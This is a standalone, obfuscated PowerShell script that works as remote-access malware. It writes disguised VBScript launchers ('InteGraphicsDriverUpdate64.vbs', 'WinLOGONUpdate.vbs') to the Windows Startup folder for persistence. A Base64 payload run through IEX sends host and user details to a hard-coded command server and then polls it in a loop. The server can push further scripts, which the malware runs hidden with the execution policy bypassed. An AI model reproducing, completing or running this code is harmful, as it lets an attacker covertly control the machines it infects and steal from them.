Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName Microsoft.VisualBasic

function DropToStartup() {
    [String] $startup = [System.Text.Encoding]::Default.GetString(@(83,101,116,32,79,66,66,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,87,83,99,114,105,112,116,46,83,104,101,108,108,34,41,13,10,79,66,66,46,82,117,110,32,34,80,111,119,101,114,83,104,101,108,108,32,45,69,120,101,99,117,116,105,111,110,80,111,108,105,99,121,32,82,101,109,111,116,101,83,105,103,110,101,100,32,45,70,105,108,101,32,34,43,34,37,70,73,76,69,37,34,44,48))
    [System.IO.File]::WriteAllText([System.Environment]::GetFolderPath(7) + '\InteGraphicsDriverUpdate64.vbs', $startup.Replace('%FILE%', $PSCommandPath))
}
DropToStartup
IEX ([System.Text.UTF8Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uV2luZG93cy5Gb3Jtcw0KQWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBNaWNyb3NvZnQuVmlzdWFsQmFzaWMNCg0KW1N0cmluZ10gJEROUyA9ICdyaWNrNjMucHVibGljdm0uY29tJw0KW1N0cmluZ10gJFBvcnQgPSAnMTg0OScNCltTdHJpbmddICRTUEwgPSAnfFZ8Jw0KJEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJw0KDQpmdW5jdGlvbiBEcm9wVG9TdGFydHVwKCkgew0KICAgIFtTdHJpbmddICRzdGFydHVwID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6RGVmYXVsdC5HZXRTdHJpbmcoQCg4MywxMDEsMTE2LDMyLDc5LDY2LDY2LDMyLDYxLDMyLDY3LDExNCwxMDEsOTcsMTE2LDEwMSw3OSw5OCwxMDYsMTAxLDk5LDExNiw0MCwzNCw4Nyw4Myw5OSwxMTQsMTA1LDExMiwxMTYsNDYsODMsMTA0LDEwMSwxMDgsMTA4LDM0LDQxLDEzLDEwLDc5LDY2LDY2LDQ2LDgyLDExNywxMTAsMzIsMzQsODAsMTExLDExOSwxMDEsMTE0LDgzLDEwNCwxMDEsMTA4LDEwOCwzMiw0NSw2OSwxMjAsMTAxLDk5LDExNywxMTYsMTA1LDExMSwxMTAsODAsMTExLDEwOCwxMDUsOTksMTIxLDMyLDgyLDEwMSwxMDksMTExLDExNiwxMDEsODMsMTA1LDEwMywxMTAsMTAxLDEwMCwzMiw0NSw3MCwxMDUsMTA4LDEwMSwzMiwzNCw0MywzNCwzNyw3MCw3Myw3Niw2OSwzNywzNCw0NCw0OCkpDQogICAgW1N5c3RlbS5JTy5GaWxlXTo6V3JpdGVBbGxUZXh0KFtTeXN0ZW0uRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKDcpICsgJ1xJbnRlR3JhcGhpY3NEcml2ZXJVcGRhdGUudmJzJywgJHN0YXJ0dXAuUmVwbGFjZSgnJUZJTEUlJywgJFBTQ29tbWFuZFBhdGgpKQ0KfQ0KDQpGdW5jdGlvbiBQT1NUKCREQSwgJFBhcmFtKSB7DQogICAgW1N0cmluZ10gJFJlc3BvbnNlID0gJycNCiAgICBbT2JqZWN0XSAkSHR0cE9iamVjdCA9IFtBY3RpdmF0b3JdOjpDcmVhdGVJbnN0YW5jZShbVHlwZV06OkdldFR5cGVGcm9tUHJvZ0lEKCdNaWNyb3NvZnQuWE1MSFRUUCcpKQ0KICAgIHRyeSB7DQogICAgICAgICRIdHRwT2JqZWN0Lk9wZW4oJ1BPU1QnLCAnaHR0cDovLycgKyAkRE5TICsgJzonICsgJFBvcnQgKyAnLycgKyAkREEsICRmYWxzZSkNCiAgICAgICAgJEh0dHBPYmplY3QuU2V0UmVxdWVzdEhlYWRlcignVXNlci1BZ2VudDonLCAkSW5mbykNCiAgICAgICAgJEh0dHBPYmplY3QuU2VuZCgkUGFyYW0pDQogICAgICAgICRSZXNwb25zZSA9IFtDb252ZXJ0XTo6VG9TdHJpbmcoJEh0dHBPYmplY3QuUmVzcG9uc2VUZXh0KQ0KICAgIH0NCiAgICBjYXRjaCB7IH0NCiAgICByZXR1cm4gJFJlc3BvbnNlDQp9DQoNCkZ1bmN0aW9uIElORiB7DQogICAgW1N0cmluZ10gJE1BQyA9IEhXSUQoJGVudjpjb21wdXRlcm5hbWUpDQogICAgW1N0cmluZ10gJElEID0gJ05ld18nICsgJE1BQw0KICAgIFtTdHJpbmddICRWRVIgPSAndjAuMicNCiAgICBbU3RyaW5nXSAkT1MgPSBbTWljcm9zb2Z0LlZpc3VhbEJhc2ljLlN0cmluZ3NdOjpTcGxpdCgoR2V0LVdNSU9iamVjdCB3aW4zMl9vcGVyYXRpbmdzeXN0ZW0pLm5hbWUsInwiKVswXSArICIgIiArIChHZXQtV21pT2JqZWN0IFdpbjMyX09wZXJhdGluZ1N5c3RlbSkuT1NBcmNoaXRlY3R1cmUNCiAgICBbU3RyaW5nXSAkQVYgPSAnV2luZG93cyBEZWZlbmRlcicNCiAgICByZXR1cm4gJElEICsgIlwiICsgKCRlbnY6Q09NUFVURVJOQU1FKSArICJcIiArICgkZW52OlVzZXJOYW1lKSArICJcIiArICRPUyArICJcIiArICRBViArICJcIiArICJZZXMiICsgIlwiICsgIlllcyIgKyAiXCIgKyAiRkFMU0UiICsgIlwiDQp9DQoNCkZ1bmN0aW9uIEhXSUQoJHN0ckNvbXB1dGVyKSB7DQogICAgJEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJw0KICAgICRsb2wgPSBbU3lzdGVtLkNvbnZlcnRdOjpUb1N0cmluZygoZ2V0LXdtaW9iamVjdCBXaW4zMl9Db21wdXRlclN5c3RlbVByb2R1Y3QgIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgVVVJRCkpDQogICAgcmV0dXJuIChbTWljcm9zb2Z0LlZpc3VhbEJhc2ljLlN0cmluZ3NdOjpTcGxpdCgkbG9sLCctJylbMF0gKyBbTWljcm9zb2Z0LlZpc3VhbEJhc2ljLlN0cmluZ3NdOjpTcGxpdCgkbG9sLCctJylbMV0pDQp9DQoNCiNEcm9wVG9TdGFydHVwDQpbU3RyaW5nXSAkSW5mbyA9IElORg0KDQp3aGlsZSgkdHJ1ZSkNCnsNCiAgICAkQSA9IFtNaWNyb3NvZnQuVmlzdWFsQmFzaWMuU3RyaW5nc106OlNwbGl0KChQT1NUKCJWcmUiLCAiIikpICwgJFNQTCkNCiAgICBzd2l0Y2goJEFbMF0pIHsNCiAgICAgICAgJ1RSJyB7DQogICAgICAgICAgICBbU3RyaW5nXSAkUHNGaWxlTmFtZSA9ICBbU3lzdGVtLkd1aWRdOjpOZXdHdWlkKCkuVG9TdHJpbmcoKS5SZXBsYWNlKCItIiwgIiIpICsgIi5QUzEiDQogICAgICAgICAgICBbU3RyaW5nXSAkU3RhcnR1cENvbnRlbnQgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpEZWZhdWx0LkdldFN0cmluZyhAKDgzLDEwMSwxMTYsMzIsODcsMTE1LDEwNCw4MywxMDQsMTAxLDEwOCwxMDgsMzIsNjEsMzIsNjcsMTE0LDEwMSw5NywxMTYsMTAxLDc5LDk4LDEwNiwxMDEsOTksMTE2LDQwLDM0LDg3LDgzLDk5LDExNCwxMDUsMTEyLDExNiw0Niw4MywxMDQsMTAxLDEwOCwxMDgsMzQsNDEsMTMsMTAsODcsMTE1LDEwNCw4MywxMDQsMTAxLDEwOCwxMDgsNDYsODIsMTE3LDExMCwzMiwzNCw4MCwxMTEsMTE5LDEwMSwxMTQsMTE1LDEwNCwxMDEsMTA4LDEwOCwzMiw0NSw2OSwxMjAsMTAxLDk5LDExNywxMTYsMTA1LDExMSwxMTAsODAsMTExLDEwOCwxMDUsOTksMTIxLDMyLDY2LDEyMSwxMTIsOTcsMTE1LDExNSwzMiw0NSw3MCwxMDUsMTA4LDEwMSwzMiwzNCwzMiw0MywzMiwzNCwzNyw4MCw4NCwzNywzNCw0NCwzMiw0OCkpDQogICAgICAgICAgICAkVGFyZ2V0UGF0aCA9IFtTeXN0ZW0uSU8uUGF0aF06OkdldFRlbXBQYXRoKCkgKyAkUHNGaWxlTmFtZQ0KICAgICAgICAgICAgW1N5c3RlbS5JTy5GaWxlXTo6V3JpdGVBbGxUZXh0KCRUYXJnZXRQYXRoLCAkQVsxXSkNCiAgICAgICAgICAgIFtTeXN0ZW0uSU8uRmlsZV06OldyaXRlQWxsVGV4dChbU3lzdGVtLkVudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aCg3KSArICJcV2luTE9HT05VcGRhdGUudmJzIiwgJFN0YXJ0dXBDb250ZW50LlJlcGxhY2UoIiVQVCUiLCAkVGFyZ2V0UGF0aCkpDQogICAgICAgICAgICBQb3dlclNoZWxsIC1XaW5kb3dTdHlsZSBIaWRkZW4gLUV4ZWN1dGlvblBvbGljeSBSZW1vdGVTaWduZWQgLUZpbGUgJFRhcmdldFBhdGgNCiAgICAgICAgYnJlYWsgfQ0KDQogICAgICAgICdDbCcgew0KICAgICAgICAgICAgW0Vudmlyb25tZW50XTo6RXhpdCgwKQ0KICAgICAgICBicmVhayB9DQoJDQoJJ1VuJyB7DQoJICAgIFtFbnZpcm9ubWVudF06OkV4aXQoMCkNCglicmVhayB9DQogICAgfQ0KICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgMzAwMA0KfQ==')))